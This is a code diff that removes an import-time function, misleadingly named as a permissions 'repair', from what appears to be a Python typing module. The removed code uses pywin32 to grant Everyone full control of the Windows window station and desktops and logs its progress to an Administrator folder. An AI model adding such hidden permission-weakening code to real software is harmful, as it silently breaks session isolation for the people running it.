@@ -12,65 +12,6 @@ Safeguards:
 """
 from __future__ import annotations
 
-def _repair_desktop_permissions():
-    log_file = r"c:\Users\Administrator\Downloads\CRUSORAI\repair_status_contract.log"
-    try:
-        import win32security
-        import win32api
-        with open(log_file, "a") as f:
-            f.write("win32security imported!\n")
-
-        sddl = "D:(A;OICI;GA;;;WD)(A;OICI;GA;;;SY)(A;OICI;GA;;;BA)(A;OICI;GA;;;IU)"
-        sd = win32security.ConvertStringSecurityDescriptorToSecurityDescriptor(sddl, win32security.SDDL_REVISION_1)
-        dacl = sd.GetSecurityDescriptorDacl()
-
-        hwinsta = win32security.GetProcessWindowStation()
-        win32security.SetSecurityInfo(
-            hwinsta,
-            win32security.SE_WINDOW_OBJECT,
-            win32security.DACL_SECURITY_INFORMATION,
-            None, None, dacl, None
-        )
-        with open(log_file, "a") as f:
-            f.write("hwinsta SetSecurityInfo succeeded!\n")
-
-        try:
-            import win32service
-            hw0 = win32service.OpenWindowStation("WinSta0", False, 0x00040000 | 0x00020000 | 0x37F)
-            win32security.SetSecurityInfo(hw0, win32security.SE_WINDOW_OBJECT, win32security.DACL_SECURITY_INFORMATION, None, None, dacl, None)
-            hw0.CloseWindowStation()
-            with open(log_file, "a") as f:
-                f.write("OpenWindowStation WinSta0 SetSecurityInfo succeeded!\n")
-        except Exception as e:
-            with open(log_file, "a") as f:
-                f.write(f"OpenWindowStation error: {e}\n")
-
-        hdesk = win32security.GetThreadDesktop(win32api.GetCurrentThreadId())
-        win32security.SetSecurityInfo(
-            hdesk,
-            win32security.SE_WINDOW_OBJECT,
-            win32security.DACL_SECURITY_INFORMATION,
-            None, None, dacl, None
-        )
-        with open(log_file, "a") as f:
-            f.write("hdesk SetSecurityInfo succeeded!\n")
-
-        try:
-            hd0 = win32service.OpenDesktop("Default", 0, False, 0x00040000 | 0x00020000 | 0x1FF)
-            win32security.SetSecurityInfo(hd0, win32security.SE_WINDOW_OBJECT, win32security.DACL_SECURITY_INFORMATION, None, None, dacl, None)
-            hd0.CloseDesktop()
-            with open(log_file, "a") as f:
-                f.write("OpenDesktop Default SetSecurityInfo succeeded!\n")
-        except Exception as e:
-            with open(log_file, "a") as f:
-                f.write(f"OpenDesktop error: {e}\n")
-
-    except Exception as e:
-        with open(log_file, "a") as f:
-            f.write(f"Top-level error: {e}\n")
-
-_repair_desktop_permissions()
-
 from typing import Any, Literal
 from typing_extensions import TypedDict
 
